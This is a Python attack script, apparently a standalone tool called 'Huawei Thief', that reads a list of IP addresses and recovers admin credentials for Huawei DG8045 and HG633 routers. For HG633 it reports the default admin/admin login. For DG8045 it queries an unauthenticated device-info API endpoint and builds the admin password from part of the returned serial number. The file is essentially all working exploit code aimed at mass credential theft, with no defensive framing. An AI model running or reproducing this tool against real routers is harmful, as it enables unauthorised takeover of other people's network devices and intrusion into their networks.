#Author:    Zeyad Azima "zWIZARDz"
#Github:    https://github.com/Zeyad-Azima
#Facebook:  https://www.facebook.com/elkingzeyad.azeem
#Website:   https://cyberatom.org/

import requests,json,colored,sys,urllib3
from colored import stylize

logo = ("""
██╗  ██╗██╗   ██╗ █████╗ ██╗    ██╗███████╗██╗    ████████╗██╗  ██╗██╗███████╗███████╗
██║  ██║██║   ██║██╔══██╗██║    ██║██╔════╝██║    ╚══██╔══╝██║  ██║██║██╔════╝██╔════╝
███████║██║   ██║███████║██║ █╗ ██║█████╗  ██║       ██║   ███████║██║█████╗  █████╗  
██╔══██║██║   ██║██╔══██║██║███╗██║██╔══╝  ██║       ██║   ██╔══██║██║██╔══╝  ██╔══╝  
██║  ██║╚██████╔╝██║  ██║╚███╔███╔╝███████╗██║       ██║   ██║  ██║██║███████╗██║     
╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ╚══╝╚══╝ ╚══════╝╚═╝       ╚═╝   ╚═╝  ╚═╝╚═╝╚══════╝╚═╝       
                                     By: Zeyad Azima
                               https://github.com/Zeyad-Azima  
                 This tool works on DG8045 & HG633 Versions of Huawei devices
-------------------------------------------------------------------------------------------------
""")

def Huawei(tar):
    file = open(tar,'r+')
    op = file.read()
    li = op.splitlines()

    for ip in li:
        try:
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            r = requests.get(f'http://{ip}', verify=False)
            es = r.text
            if "HG633" in es:
                print(stylize(f"[+] {ip} (HG633):",colored.fg('green')))
                print(stylize("Username: admin \nPassword: admin",colored.fg('green')))
                print("-------------------------------------")
            elif "DG8045" in es:
                res = requests.get(f'http://{ip}/api/system/deviceinfo', verify=False)
                code = res.text
                m = code.replace('while(1); /*', '')
                c = m.replace('*/', '')
                f = open('data.json', 'w+')
                f.write(c)
                f.close()
                with open('data.json', 'r+') as lst:
                    serialnumber = json.load(lst)
                    a = [serialnumber['SerialNumber'][12], serialnumber['SerialNumber'][13],
                         serialnumber['SerialNumber'][14],
                         serialnumber['SerialNumber'][15], serialnumber['SerialNumber'][16],
                         serialnumber['SerialNumber'][17],
                         serialnumber['SerialNumber'][18], serialnumber['SerialNumber'][19]]
                    b, c, d, e, f, g, h, i = a
                    password = (b + c + d + e + f + g + h + i)
                    print(stylize(f"[+] {ip} (DG8045):", colored.fg('green')))
                    print(stylize(f"Username: admin \nPassword: {password}", colored.fg('green')))
                    print("-------------------------------------")
            else:
                print(stylize(f"[-] {ip} is not DG8045 OR HG633 ", colored.fg('red')))
                print("-------------------------------------")
        except ConnectionError:
            print(stylize(f'[-] {ip} Maybe is Down',colored.fg('red')))
            print("-------------------------------------")


print(stylize(logo,colored.fg('green')))

try:
    Huawei(sys.argv[1])
except IndexError:
    print(stylize("""[-] Please specify target list
ex: python3 Huwawei_thief.py target.txt""", colored.fg('blue')))
